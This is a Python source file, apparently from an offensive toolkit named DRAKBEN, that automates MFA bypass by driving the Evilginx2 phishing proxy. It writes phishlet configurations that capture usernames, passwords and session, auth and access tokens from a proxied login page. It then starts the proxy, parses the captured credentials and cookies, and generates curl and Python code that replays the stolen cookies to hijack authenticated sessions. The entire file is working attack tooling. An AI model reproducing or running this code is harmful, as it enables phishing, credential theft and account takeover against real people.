"""
DRAKBEN Social Engineering - MFA Bypass (Evilginx2 Integration)
Author: @drak_ben
Description: Man-in-the-Middle Proxy for 2FA/MFA bypass via session hijacking.
"""

import logging
import subprocess
import os
import json
from typing import Optional, Dict, List
from dataclasses import dataclass

logger = logging.getLogger(__name__)

@dataclass
class CapturedSession:
    """Represents a captured authentication session"""
    target_url: str
    username: str
    password: str
    session_tokens: Dict[str, str]
    cookies: List[Dict]
    timestamp: str

class MFABypass:
    """
    Evilginx2 integration for real-time MFA bypass.
    Captures session tokens after successful 2FA authentication.
    """
    
    def __init__(self, evilginx_path: str = "/opt/evilginx2"):
        self.evilginx_path = evilginx_path
        self.phishlets_dir = os.path.join(evilginx_path, "phishlets")
        self.available = self._check_installation()
        self.process = None
        self.captured_sessions: List[CapturedSession] = []
        
        logger.info(f"MFA Bypass initialized (Evilginx2: {'Available' if self.available else 'Not Found'})")
        
    def _check_installation(self) -> bool:
        """Check if Evilginx2 is installed"""
        binary_path = os.path.join(self.evilginx_path, "evilginx")
        return os.path.exists(binary_path)
        
    def list_phishlets(self) -> List[str]:
        """List available phishlets (login page templates)"""
        phishlets = []
        if os.path.exists(self.phishlets_dir):
            for f in os.listdir(self.phishlets_dir):
                if f.endswith(".yaml"):
                    phishlets.append(f.replace(".yaml", ""))
        return phishlets
        
    def create_phishlet(self, name: str, target_domain: str, login_path: str = "/login") -> str:
        """
        Generate a custom phishlet for a target.
        """
        phishlet_content = f"""
name: '{name}'
author: 'Drakben'
min_ver: '2.4.0'

proxy_hosts:
  - phish_subdomain: ''
    orig_subdomain: ''
    domain: '{target_domain}'
    session: true
    is_landing: true

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

auth_tokens:
  - domain: '.{target_domain}'
    keys: ['session', 'auth_token', 'access_token']

login:
  domain: '{target_domain}'
  path: '{login_path}'
"""
        phishlet_path = os.path.join(self.phishlets_dir, f"{name}.yaml")
        
        try:
            os.makedirs(self.phishlets_dir, exist_ok=True)
            with open(phishlet_path, 'w') as f:
                f.write(phishlet_content)
            logger.info(f"Phishlet created: {phishlet_path}")
            return phishlet_path
        except Exception as e:
            logger.error(f"Failed to create phishlet: {e}")
            return ""
            
    def start_proxy(self, _phishlet: str, _lure_domain: str) -> bool:
        """
        Start Evilginx2 in background mode.
        """
        if not self.available:
            logger.error("Evilginx2 not installed. Cannot start proxy.")
            return False
            
        try:
            cmd = [
                os.path.join(self.evilginx_path, "evilginx"),
                "-p", self.phishlets_dir,
                "-developer"  # Developer mode for testing
            ]
            
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.evilginx_path
            )
            
            logger.info(f"Evilginx2 proxy started (PID: {self.process.pid})")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Evilginx2: {e}")
            return False
            
    def stop_proxy(self) -> None:
        """Stop Evilginx2 process"""
        if self.process:
            self.process.terminate()
            self.process = None
            logger.info("Evilginx2 proxy stopped")
            
    def parse_captured_sessions(self, log_file: str = "sessions.json") -> List[CapturedSession]:
        """
        Parse captured sessions from Evilginx2 output.
        """
        sessions = []
        log_path = os.path.join(self.evilginx_path, log_file)
        
        if os.path.exists(log_path):
            try:
                with open(log_path, 'r') as f:
                    data = json.load(f)
                    
                for entry in data.get("sessions", []):
                    session = CapturedSession(
                        target_url=entry.get("url", ""),
                        username=entry.get("username", ""),
                        password=entry.get("password", ""),
                        session_tokens=entry.get("tokens", {}),
                        cookies=entry.get("cookies", []),
                        timestamp=entry.get("time", "")
                    )
                    sessions.append(session)
                    
            except Exception as e:
                logger.error(f"Failed to parse sessions: {e}")
                
        self.captured_sessions = sessions
        return sessions

    def replay_session(self, session: CapturedSession) -> Dict[str, str]:
        """
        Generate curl command or requests code to replay captured session.
        """
        cookies_str = "; ".join([f"{c['name']}={c['value']}" for c in session.cookies])
        
        replay_code = f"""
import requests

session = requests.Session()
session.cookies.update({{{', '.join([f'"{c["name"]}": "{c["value"]}"' for c in session.cookies])}}})

# You now have authenticated session
response = session.get("{session.target_url}")
print(response.status_code)
"""
        return {
            "curl": f'curl -b "{cookies_str}" {session.target_url}',
            "python": replay_code
        }
